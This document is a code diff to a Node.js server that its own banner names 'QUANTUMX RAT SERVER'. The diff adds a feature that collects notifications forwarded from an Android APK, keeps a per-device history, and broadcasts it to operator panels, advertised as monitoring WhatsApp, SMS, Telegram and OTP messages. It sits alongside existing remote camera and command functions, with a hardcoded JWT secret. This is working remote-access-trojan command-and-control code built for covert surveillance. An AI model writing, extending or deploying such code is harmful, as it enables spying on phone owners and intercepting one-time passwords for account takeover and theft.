@@ -36,6 +36,9 @@ let commandResults = new Map();
 // Camera sessions tracking
 let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }
 
+// ========== NOTIFICATION STORAGE ==========
+let notificationsHistory = new Map(); // deviceId -> array of notifications
+
 // ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
 
@@ -119,7 +122,25 @@ app.get('/api/devices', authenticateToken, (req, res) => {
     res.json(deviceList);
 });
 
-// Send lockscreen command
+// Get notifications history untuk device tertentu
+app.get('/api/device/:deviceId/notifications', authenticateToken, (req, res) => {
+    const deviceId = req.params.deviceId;
+    const history = notificationsHistory.get(deviceId) || [];
+    res.json({ 
+        success: true, 
+        notifications: history,
+        count: history.length 
+    });
+});
+
+// Clear notifications untuk device tertentu
+app.delete('/api/device/:deviceId/notifications', authenticateToken, (req, res) => {
+    const deviceId = req.params.deviceId;
+    notificationsHistory.delete(deviceId);
+    res.json({ success: true, message: 'Notifications cleared' });
+});
+
+// Send command
 app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, params } = req.body;
@@ -322,6 +343,43 @@ io.on('connection', (socket) => {
         });
     });
     
+    // ===== NOTIFICATION DARI APK =====
+    socket.on('notification', (data) => {
+        const { deviceId, package: packageName, text, title, content, time } = data;
+        
+        console.log(`📨 [NOTIFICATION] from ${deviceId} - ${packageName}: ${title || text}`);
+        
+        // Update last seen device
+        if (devices.has(deviceId)) {
+            const device = devices.get(deviceId);
+            device.lastSeen = new Date().toISOString();
+            devices.set(deviceId, device);
+        }
+        
+        // Simpan ke history
+        if (!notificationsHistory.has(deviceId)) {
+            notificationsHistory.set(deviceId, []);
+        }
+        
+        const notificationData = {
+            deviceId,
+            package: packageName,
+            text,
+            title,
+            content,
+            time: time || Date.now(),
+            receivedAt: new Date().toISOString()
+        };
+        
+        const history = notificationsHistory.get(deviceId);
+        history.unshift(notificationData);
+        // Batasi hanya 50 notifikasi terakhir
+        if (history.length > 50) history.pop();
+        
+        // Kirim ke semua panel
+        io.emit('notification', notificationData);
+    });
+    
     // ===== HEARTBEAT DARI APK =====
     socket.on('heartbeat', (data) => {
         const { deviceId, batteryLevel, deviceName, androidVersion, networkType, networkName } = data;
@@ -440,11 +498,12 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║              QUANTUMX RAT SERVER v7.0 - FINAL                ║
+║              QUANTUMX RAT SERVER v8.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
 ║  API: http://localhost:${PORT}/api                                      ║
+║  NEW: NOTIFICATION MONITOR (WhatsApp, SMS, Telegram, OTP)   ║
 ╠══════════════════════════════════════════════════════════════╣
     `);
 });
